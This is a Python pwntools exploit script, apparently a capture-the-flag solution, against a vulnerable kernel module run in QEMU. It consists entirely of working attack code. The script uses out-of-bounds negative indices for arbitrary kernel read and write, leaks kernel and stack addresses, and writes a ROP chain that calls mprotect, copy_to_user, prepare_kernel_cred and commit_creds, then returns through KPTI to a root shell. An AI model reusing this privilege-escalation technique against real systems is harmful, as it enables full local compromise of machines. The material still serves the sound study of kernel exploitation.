#!/usr/bin/python3

from pwn import *

context.arch = "amd64"

r = process("./start-qemu.sh")

def sl(a, b):
    log.info(f"[DEBUG] Sending: {b}")
    r.sendlineafter(a, b)

def format_(data):
    i = 0
    d = ""
    data = str(data.hex())
    while (i < len(data)):
        d += data[i:i+2] + " "
        i += 2
    return data

def deformat(data):
    data = data.replace(" ", "")
    return bytes.fromhex(data)

def alloc(index, size):
    log.info(f"[DEBUG] Allocating index: {index}, size: {size}")
    sl("> ", "1")
    sl("index: ", str(index))
    sl("size: ", str(size))
    return

def free(index):
    log.info(f"[DEBUG] Freeing index: {index}")
    sl("> ", "4")
    sl("index: ", str(index))
    return

def edit(index, size, data):
    log.info(f"[DEBUG] Editing index: {index}, size: {size}, data: {data.hex()}")
    sl("> ", "2")
    sl("index: ", str(index))
    sl("size: ", str(size))
    sl("data: ", format_(data))
    return

def show(index, size):
    log.info(f"[DEBUG] Showing index: {index}, size: {size}")
    sl("> ", "3")
    sl("index: ", str(index))
    sl("size: ", str(size))
    r.recvuntil("[+] Data: ")
    data = deformat(r.recvline().strip().decode())
    log.info(f"[DEBUG] Received data: {data.hex()}")
    return data

def arb_write(addr, value):
    log.info(f"[DEBUG] Arb Write: {hex(addr)} -> {hex(value)}")
    edit(-128, 8, p64(addr))
    edit(-88, 8, p64(value))

def arb_write_payload(addr, payload):
    log.info(f"[DEBUG] Writing payload at: {hex(addr)}")
    edit(-128, 8, p64(addr))
    edit(-88, len(payload), payload)

def arb_read(addr):
    edit(-128, 8, p64(addr))
    val = u64(show(-88, 8))
    log.info(f"[DEBUG] Arb Read: {hex(addr)} -> {hex(val)}")
    return val

def main():
    log.info("[+] Starting exploitation...")
    leak = show(-128, 0x10)
    kernel_leak = u64(leak[8::])
    log.info(f"[DEBUG] Kernel leak: {hex(kernel_leak)}")
    
    kernel_base = kernel_leak - 0xeabbc0
    log.info(f"[DEBUG] Kernel base: {hex(kernel_base)}")
    
    init_task = kernel_base + 0xe12580
    log.info(f"[DEBUG] init_task: {hex(init_task)}")
    
    prev = arb_read(init_task + 0x2f8) - 0x2f0
    log.info(f"[DEBUG] prev: {hex(prev)}")
    
    stack_leak = arb_read(prev + 0x20)
    log.info(f"[DEBUG] Stack leak: {hex(stack_leak)}")
    
    stack_context_switch = stack_leak + 0x3eb0
    log.info(f"[DEBUG] Stack context switch: {hex(stack_context_switch)}")
        
    binary_leak = arb_read(stack_context_switch + 0xc0)
    log.info(f"[DEBUG] Binary leak: {hex(binary_leak)}")

    binary_base = binary_leak & ~0xfff
    log.info(f"[DEBUG] Binary base: {hex(binary_base)}")
    
    pop_rdi = kernel_base + 0x14078a
    pop_rsi = kernel_base + 0x0ce28e
    pop_rdx = kernel_base + 0x145369
    pop_rcx = kernel_base + 0x0eb7e4
    do_mprotect_pkey = kernel_base + 0x1224f0
    _copy_to_user = kernel_base + 0x269780
    kpti_trampoline = kernel_base + 0x800e10 + 22
    prepare_kernel_cred = kernel_base + 0x72560
    commit_creds = kernel_base + 0x723c0
    mov_rdi_rax = kernel_base + 0x638e9b

    arb_write_payload(stack_leak, asm(shellcraft.sh()))

    # do_mprotect_pkey(binary_base, 0x1000, 0x7, -1)
    rop  = p64(pop_rdi)
    rop += p64(binary_base)
    rop += p64(pop_rsi)
    rop += p64(0x1000)
    rop += p64(pop_rdx)
    rop += p64(0x7)
    rop += p64(pop_rcx)
    rop += p64(0xffffffffffffffff)
    rop += p64(do_mprotect_pkey)
    
    # _copy_to_user(binary_base, stack_leak, len(asm(shellcraft.sh())))
    rop += p64(pop_rdi)
    rop += p64(binary_base)
    rop += p64(pop_rsi)
    rop += p64(stack_leak)
    rop += p64(pop_rdx)
    rop += p64(len(asm(shellcraft.sh())))
    rop += p64(_copy_to_user)

    rop += p64(pop_rdi)
    rop += p64(0)
    rop += p64(prepare_kernel_cred)
    rop += p64(pop_rcx)
    rop += p64(0)
    rop += p64(mov_rdi_rax)
    rop += p64(commit_creds)

    rop += p64(kpti_trampoline)
    rop += p64(0)*2
    rop += p64(binary_base)
    rop += p64(0x33)
    rop += p64(0x200)
    rop += p64(binary_base + 0x800)
    rop += p64(0x2b)

    arb_write_payload(stack_context_switch, rop)
    r.interactive()

main()